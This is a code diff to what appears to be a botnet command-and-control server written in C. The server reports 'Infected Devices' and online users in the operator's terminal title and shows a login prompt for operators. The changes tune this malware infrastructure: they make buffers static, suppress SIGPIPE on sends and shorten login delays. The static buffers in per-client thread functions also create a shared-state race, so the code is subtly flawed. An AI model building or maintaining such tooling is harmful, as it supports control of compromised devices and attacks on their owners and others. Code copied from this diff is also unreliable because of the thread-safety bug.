@@ -18,6 +18,8 @@ void setup_signal_handlers() {
 void* update_title(void* arg) {
     int client_socket = *((int*)arg);
     free(arg);
+    static char buffer[128];
+    static int written;
 
     while (1) {
         int valid_bots = 0;
@@ -45,10 +47,9 @@ void* update_title(void* arg) {
         }
         pthread_mutex_unlock(&user_sockets_mutex);
 
-        char buffer[128] = {0};
-        int written = snprintf(buffer, sizeof(buffer), "\0337\033]0;Infected Devices: %d | Users Online: %d\007\0338", valid_bots, users_online);
+        written = snprintf(buffer, sizeof(buffer), "\0337\033]0;Infected Devices: %d | Users Online: %d\007\0338", valid_bots, users_online);
         if (written > 0 && written < (int)sizeof(buffer) && client_socket > 0) {
-            if (send(client_socket, buffer, (size_t)written, 0) < 0) break;
+            if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) break;
         }
 
         sleep(2);
@@ -93,18 +94,20 @@ void* handle_client(void* arg) {
     char discard_buf[256];
     while (recv(client_socket, discard_buf, sizeof(discard_buf), MSG_DONTWAIT) > 0) {}
 
-    char buffer[256] = {0};
-    int written = snprintf(buffer, sizeof(buffer), "\r" YELLOW "Login: " RESET);
+    static char buffer[256];
+    static int written;
+
+    written = snprintf(buffer, sizeof(buffer), "\r" YELLOW "Login: " RESET);
     if (written <= 0 || written >= (int)sizeof(buffer)) {
         close(client_socket);
         return NULL;
     }
-    if (send(client_socket, buffer, (size_t)written, 0) < 0) {
+    if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) {
         close(client_socket);
         return NULL;
     }
 
-    usleep(2800000);
+    usleep(1800000);
 
     char username[64] = {0}, password[64] = {0};
     ssize_t len = recv(client_socket, username, sizeof(username) - 1, 0);
@@ -126,12 +129,12 @@ void* handle_client(void* arg) {
         close(client_socket);
         return NULL;
     }
-    if (send(client_socket, buffer, (size_t)written, 0) < 0) {
+    if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) {
         close(client_socket);
         return NULL;
     }
 
-    usleep(2800000);
+    usleep(1800000);
 
     len = recv(client_socket, password, sizeof(password) - 1, 0);
     if (len <= 0) {
@@ -152,7 +155,7 @@ void* handle_client(void* arg) {
         // Next time dont update file directly
         // Note: backup before trying solution
         snprintf(buffer, sizeof(buffer), "\r" RED "Invalid login" RESET "\r\n");
-        send(client_socket, buffer, strlen(buffer), 0);
+        send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL);
         close(client_socket);
         return NULL;
     }
